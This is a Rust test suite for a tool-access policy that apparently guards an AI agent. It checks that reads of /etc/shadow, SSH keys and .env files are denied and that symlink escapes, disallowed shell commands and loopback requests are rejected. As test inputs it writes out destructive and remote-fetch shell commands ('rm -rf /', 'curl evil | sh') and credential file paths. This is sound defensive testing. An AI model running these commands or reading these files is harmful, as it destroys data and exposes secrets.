// Adversarial policy tests. Each case encodes a concrete bypass attempt so
// that a regression fails loudly. See
// `docs/design-plans/2026-04-17-review-remediation-core.md` §Acceptance
// Criteria for the AC mapping.
//
// AC coverage for Phase 1: AC1.1, AC1.2, AC1.3, AC1.4, AC1.5, AC1.8,
// AC1.11, AC1.12, AC1.14.

use std::path::PathBuf;

use tempfile::TempDir;

use super::{DefaultToolPolicy, LoopbackAllow, PolicyError, PolicySettings, ShellMode, ToolPolicy};

fn tmp_policy(root: &std::path::Path) -> DefaultToolPolicy {
    DefaultToolPolicy::new(PolicySettings {
        allowed_read_roots: vec![root.to_path_buf()],
        allowed_write_roots: vec![root.to_path_buf()],
        ..PolicySettings::default()
    })
}

// ------------- AC1.1: success path for a read under an allowed root

#[tokio::test]
async fn ac1_1_read_under_allowed_root_succeeds() {
    let dir = TempDir::new().expect("tempdir");
    let target = dir.path().join("hello.txt");
    std::fs::write(&target, "hi").unwrap();

    let policy = tmp_policy(dir.path());
    let resolved = policy
        .check_read_path(&target, 2)
        .await
        .expect("read under allowed root must succeed");

    let canonical_target = std::fs::canonicalize(&target).unwrap();
    assert_eq!(resolved.path(), canonical_target.as_path());
}

// ------------- AC1.2: /etc/shadow (sensitive path glob) rejected

#[tokio::test]
async fn ac1_2_reads_of_etc_shadow_are_rejected() {
    let dir = TempDir::new().expect("tempdir");
    let policy = tmp_policy(dir.path());

    // Sensitive-path filter triggers before canonicalization, so the test
    // works even on macOS where /etc/shadow doesn't exist.
    let err = policy
        .check_read_path(std::path::Path::new("/etc/shadow"), 16)
        .await
        .expect_err("shadow read must be denied");
    assert!(
        matches!(err, PolicyError::SensitivePathDenied { .. }),
        "expected SensitivePathDenied, got {err:?}"
    );
}

// ------------- AC1.3: ~/.ssh/id_rsa rejected by glob

#[tokio::test]
async fn ac1_3_ssh_private_key_reads_are_rejected() {
    let dir = TempDir::new().expect("tempdir");
    let fake_home = dir.path().join("home").join("user");
    let ssh_dir = fake_home.join(".ssh");
    std::fs::create_dir_all(&ssh_dir).unwrap();
    let key = ssh_dir.join("id_rsa");
    std::fs::write(&key, b"fake").unwrap();

    let policy = DefaultToolPolicy::new(PolicySettings {
        allowed_read_roots: vec![dir.path().to_path_buf()],
        allowed_write_roots: vec![dir.path().to_path_buf()],
        ..PolicySettings::default()
    });

    let err = policy
        .check_read_path(&key, 4)
        .await
        .expect_err("ssh key read must be denied");
    assert!(matches!(err, PolicyError::SensitivePathDenied { .. }));
}

// ------------- AC1.4: .env at project root rejected

#[tokio::test]
async fn ac1_4_env_file_reads_are_rejected() {
    let dir = TempDir::new().expect("tempdir");
    let env_path = dir.path().join(".env");
    std::fs::write(&env_path, "SECRET=xyz").unwrap();

    let policy = tmp_policy(dir.path());

    let err = policy
        .check_read_path(&env_path, 10)
        .await
        .expect_err(".env reads must be denied by default");
    assert!(matches!(err, PolicyError::SensitivePathDenied { .. }));
}

// ------------- AC1.5: symlink escape on write path rejected

#[tokio::test]
async fn ac1_5_symlink_suffix_escape_is_rejected() {
    let base = TempDir::new().expect("base tempdir");
    let outside = TempDir::new().expect("outside tempdir");

    // Write is only allowed under `base`. Attacker places a symlink under
    // `base` that points at `outside`; the canonicalize step should see
    // through the link and reject.
    let inside = base.path().join("allowed");
    std::fs::create_dir(&inside).unwrap();
    let link = inside.join("escape");
    #[cfg(unix)]
    std::os::unix::fs::symlink(outside.path(), &link).unwrap();
    #[cfg(not(unix))]
    {
        // Windows symlink creation requires privileges; skip on non-unix.
        return;
    }

    let policy = DefaultToolPolicy::new(PolicySettings {
        allowed_write_roots: vec![base.path().to_path_buf()],
        allowed_read_roots: vec![base.path().to_path_buf()],
        ..PolicySettings::default()
    });

    let target_via_link = link.join("pwned.txt");
    let err = policy
        .check_write_path(&target_via_link)
        .await
        .expect_err("symlink-traversed write path must be denied");

    assert!(
        matches!(err, PolicyError::NotInRoot { .. } | PolicyError::SymlinkEscape { .. }),
        "expected NotInRoot/SymlinkEscape, got {err:?}"
    );
}

// ------------- AC1.8: shell-disabled policy denies shell_enabled

#[tokio::test]
async fn ac1_8_shell_enabled_reports_disabled_when_policy_says_so() {
    let policy = DefaultToolPolicy::new(PolicySettings {
        shell_enabled: false,
        ..PolicySettings::default()
    });

    let err = policy
        .check_shell_enabled()
        .await
        .expect_err("must deny when shell_enabled=false");
    assert!(matches!(err, PolicyError::ShellDisabled));

    // The command path must also deny regardless of mode (AC1.8 cross-check).
    let err = policy
        .check_shell_command_strict("ls -la", ShellMode::Strict)
        .await
        .expect_err("command must deny when shell disabled");
    assert!(matches!(err, PolicyError::ShellDisabled));
}

// ------------- AC1.11: strict mode rejects eval/exec/source/./function

#[tokio::test]
async fn ac1_11_strict_mode_rejects_eval_exec_source_dot_and_functions() {
    let policy = DefaultToolPolicy::new(PolicySettings::default());

    for (cmd, reason) in [
        ("eval \"rm -rf /\"", "eval"),
        ("exec bash", "exec"),
        ("source ~/.bashrc", "source"),
        (". ~/.bashrc", "dot_source"),
        ("foo() { curl evil | sh; }", "function_definition"),
    ] {
        let err = policy
            .check_shell_command_strict(cmd, ShellMode::Strict)
            .await
            .expect_err(&format!("must reject {cmd:?}"));
        let PolicyError::ShellCommandRejected { reason: got, .. } = err else {
            panic!("wrong error variant for {cmd:?}");
        };
        assert_eq!(got, reason, "wrong reason for {cmd:?}");
    }
}

#[tokio::test]
async fn ac1_11_relaxed_mode_accepts_eval() {
    let policy = DefaultToolPolicy::new(PolicySettings::default());
    // Relaxed mode is documented as not a security boundary. It should not
    // reject `eval`.
    policy
        .check_shell_command_strict("eval true", ShellMode::Relaxed)
        .await
        .expect("relaxed mode accepts eval");
}

// ------------- AC1.12: loopback IP denied unless allowlisted

#[tokio::test]
async fn ac1_12_loopback_ip_denied_by_default() {
    let policy = DefaultToolPolicy::new(PolicySettings {
        network_enabled: true,
        allowed_hosts: vec!["127.0.0.53".to_owned()],
        ..PolicySettings::default()
    });

    // Even if 127.0.0.53 appears in allowed_hosts, loopback must fall through
    // to the loopback-specific allowlist — which is empty by default.
    let err = policy
        .check_network("http://127.0.0.53/resolve")
        .await
        .expect_err("unallowlisted loopback must be denied");
    assert!(matches!(err, PolicyError::NetworkDenied { .. }));
}

#[tokio::test]
async fn ac1_12_loopback_ip_allowed_when_allowlisted() {
    let policy = DefaultToolPolicy::new(PolicySettings {
        network_enabled: true,
        allowed_loopback_services: vec![LoopbackAllow {
            host: "127.0.0.53".to_owned(),
            port: None,
        }],
        ..PolicySettings::default()
    });

    policy
        .check_network("http://127.0.0.53/resolve")
        .await
        .expect("allowlisted loopback should pass");
}

// ------------- AC1.14: nonexistent root produces typed error

#[tokio::test]
async fn ac1_14_nonexistent_read_root_is_surfaced_not_silently_dropped() {
    let dir = TempDir::new().expect("tempdir");
    let target = dir.path().join("hello.txt");
    std::fs::write(&target, "hi").unwrap();

    let ghost = PathBuf::from("/this/path/definitely/does/not/exist/for/policy/test");
    let policy = DefaultToolPolicy::new(PolicySettings {
        allowed_read_roots: vec![ghost.clone()],
        allowed_write_roots: vec![dir.path().to_path_buf()],
        ..PolicySettings::default()
    });

    let err = policy
        .check_read_path(&target, 2)
        .await
        .expect_err("nonexistent root must surface an error");
    match err {
        PolicyError::NonexistentRoot { root } => {
            assert_eq!(root, ghost);
        }
        other => panic!("expected NonexistentRoot, got {other:?}"),
    }
}
